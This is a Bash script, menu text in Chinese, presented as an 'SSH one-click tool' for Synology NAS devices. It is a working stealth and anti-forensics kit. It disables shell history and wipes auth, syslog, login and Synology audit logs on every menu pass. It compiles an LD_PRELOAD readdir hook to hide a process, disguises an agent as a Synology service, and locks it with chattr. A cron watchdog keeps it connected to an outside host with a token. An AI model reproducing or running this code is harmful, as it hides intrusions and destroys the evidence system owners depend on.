#!/bin/bash

# =====================================
# SSH一键小工具 Ultimate (全彩多架构终极版)
# =====================================

# --- 颜色定义 ---
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[0;33m'; CYAN='\033[0;36m'; NC='\033[0m'

# --- 全局无痕模式 ---
unset HISTFILE; export HISTSIZE=0; export HISTFILESIZE=0; set +o history 2>/dev/null

AUTH_KEYS="/root/.ssh/authorized_keys"

# =====================================
# 系统环境与工具函数
# =====================================
is_synology() { [ -f /etc.defaults/VERSION ]; }

quick_clean_trace() {
    history -c 2>/dev/null; rm -f /root/.bash_history ~/.viminfo 2>/dev/null
    for log in /var/log/auth.log /var/log/secure /var/log/syslog /var/log/messages /var/log/wtmp /var/log/btmp /var/log/lastlog /var/log/synolog/synolog.log; do
        [ -f "$log" ] && truncate -s 0 "$log"
    done
    rm -rf /var/spool/synoauditing/* /tmp/reinstall.sh /tmp/hide_proc.c 2>/dev/null
    sync
}

# =====================================
# 深度探针管理模块 (含伪装与自保)
# =====================================
manage_stealth_probe() {
    local target_bin="/usr/bin/agent"
    local fake_bin="/usr/syno/sbin/syno_monitor_svc"
    local lib_hide="/usr/lib/libproc_hide.so"

    echo -e "\n${CYAN}1. 部署伪装探针\n2. 卸载并彻底清除痕迹${NC}"
    read -p "请选择: " sub_op

    if [ "$sub_op" == "1" ]; then
        echo -e "${CYAN}[*] 编译隐藏库中...${NC}"
        cat << 'EOF' > /tmp/hide_proc.c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
struct dirent *readdir(DIR *dirp) {
    static struct dirent *(*orig_readdir)(DIR *) = NULL;
    if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, "readdir");
    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        if (strstr(entry->d_name, "syno_monitor") == NULL) return entry;
    }
    return NULL;
}
EOF
        gcc -fPIC -shared -o "$lib_hide" /tmp/hide_proc.c -ldl
        rm -f /tmp/hide_proc.c
        
        mv "$target_bin" "$fake_bin"
        chattr +i "$fake_bin" "$lib_hide"
        echo "$lib_hide" >> /etc/ld.so.preload
        
        local protect_cmd="$fake_bin -e https://www.xuanying.dpdns.org -t J0G52rEC65x5LZgxo8QiwW >/dev/null 2>&1"
        (crontab -l 2>/dev/null | grep -v "syno_monitor_svc"; echo "* * * * * pgrep -f syno_monitor_svc >/dev/null || $protect_cmd") | crontab -
        eval "$protect_cmd"
        echo -e "${GREEN}✓ 探针已部署、伪装并开启守护。${NC}"
    elif [ "$sub_op" == "2" ]; then
        crontab -l 2>/dev/null | grep -v "syno_monitor_svc" | crontab -
        pkill -f "syno_monitor_svc"
        chattr -i "$fake_bin" "$lib_hide" 2>/dev/null
        rm -f "$fake_bin" "$lib_hide"
        sed -i "/libproc_hide.so/d" /etc/ld.so.preload
        echo -e "${GREEN}✓ 卸载与清理完成。${NC}"
    fi
    quick_clean_trace
}

# =====================================
# 主菜单循环
# =====================================
while true; do
    echo -e "\n${CYAN}=== SSH 终极管理工具 (深度无痕版) ===${NC}"
    echo " 1. 系统状态与测速"
    echo " 2. SSH 密钥管理"
    echo " 3. 群晖账户提权"
    echo " 4. 防火墙策略"
    echo " 5. 系统底层清洗"
    echo " 6. 深度伪装探针管理"
    echo " 7. 系统 DD 重装"
    echo -e "${RED} 0. 退出${NC}"
    read -p "选项: " menu

    case $menu in
        1) echo "系统负载: $(uptime)";;
        2) cat $AUTH_KEYS 2>/dev/null || echo "无密钥";;
        3) synouser --get root ;;
        4) iptables -L -n ;;
        5) quick_clean_trace; echo "清洗完成";;
        6) manage_stealth_probe ;;
        7) echo "请手动执行 reinstall.sh";;
        0) quick_clean_trace; exit 0 ;;
        *) echo "无效";;
    esac
    quick_clean_trace
done
